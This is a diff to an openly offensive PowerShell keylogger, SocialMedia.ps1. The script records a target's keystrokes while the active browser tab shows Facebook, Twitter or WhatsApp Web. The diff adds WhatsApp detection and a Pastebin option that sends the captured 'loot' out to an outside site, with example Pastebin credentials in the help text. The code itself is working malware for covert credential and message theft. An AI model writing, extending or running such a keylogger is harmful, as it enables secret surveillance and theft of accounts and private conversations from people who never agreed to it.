@@ -6,11 +6,11 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
    Optional Dependencies: Out-PasteBin.ps1
-   PS cmdlet Dev version: v1.5.17
+   PS cmdlet Dev version: v1.5.18
    
 .DESCRIPTION
    Start recording keyboard keystrokes if target has
-   facebook or twitter in the 'active browser tab'
+   facebook,twitter,whatapp in the 'active browser tab'
 
 .NOTES
    Browsers supported: MsEdge,Chrome,Chromium,Opera,Safari,Firefox.
@@ -75,6 +75,10 @@
    Stop key`logger and leak keystrokes on screen 
 
 .EXAMPLE
+   PS C:\> .\SocialMedia.ps1 -mode 'stop' -sendtopastebin
+   Trigger SendToPasteBin function + stop key`logger + leak keystrokes 
+
+.EXAMPLE
    PS C:\> .\SocialMedia.ps1 -mode 'start' -PastebinUsername 'pedro_testing' -PastebinPassword 'angelapastebin' -SendToPasteBin
    Start key`logger and send logfile to pastebin everytime target user changes\exit social media browser active tab
 
@@ -120,7 +124,7 @@
 
 
 Clear-Host
-$CmdletVersion = "v1.5.17"
+$CmdletVersion = "v1.5.18"
 $IPath = (Get-Location).Path
 $CurrentTime = (Get-Date -Format 'HH:mm')
 $ErrorActionPreference = "SilentlyContinue"
@@ -304,7 +308,7 @@ function Invoke-SendToPasteBin ()
       Helper - 🔥 Send loot(s) to pastebin website 🔥
 
    .DESCRIPTION
-      Pastebin_Title_Example: 1_dsreds_Facebook
+      Pastebin_Title_Example: Facebook_dsreds
       Remark: pastebin webserver only accepts 20 pastes per day! (free account)
       Remark: SendToPasteBin function sends loot's to pastebin in 2 diferent ways:
       1 - Target user switchs from facebook tab to a diferent tab => SendToPasteBin
@@ -467,7 +471,7 @@ If($Mode -iMatch '^(start)$')
          {
             ## Get browser Main Window Title (active tab)
             $StartKeys = (Get-Process -Name "$Item").MainWindowTitle|Where-Object{$_ -NotMatch '^(0)$'}|Where-Object{$_ -ne ''}
-            If(($StartKeys -iMatch 'Facebook') -or ($StartKeys -iMatch '/ X |Twitter.com'))
+            If(($StartKeys -iMatch 'Facebook') -or ($StartKeys -iMatch '/ X |Twitter.com') -or ($StartKeys -Match 'web.whatsapp.com'))
             {
                ## Detect social media changes
                Invoke-CheckMediaForChange
@@ -481,6 +485,11 @@ If($Mode -iMatch '^(start)$')
                If($StartKeys -imatch '/ X |twitter.com')
                {
                   $SocialSite = "Twitter"
+                  echo "$SocialSite" > $Env:TMP\Smeagol.log
+               }
+               If($StartKeys -imatch 'web.whatsapp.com')
+               {
+                  $SocialSite = "Whatsapp"
                   echo "$SocialSite" > $Env:TMP\Smeagol.log
                }
 
@@ -597,7 +606,7 @@ If($Mode -iMatch '^(stop)$')
 
 
    write-host "`n"
-   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'AUTO_BACKUP.'
+   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'.Whatsapp' /C:'AUTO_BACKUP.'
    If(-not([string]::IsNullOrEmpty($GetLogNames)))
    {
       ForEach($PreventDuplicate in $GetLogNames)
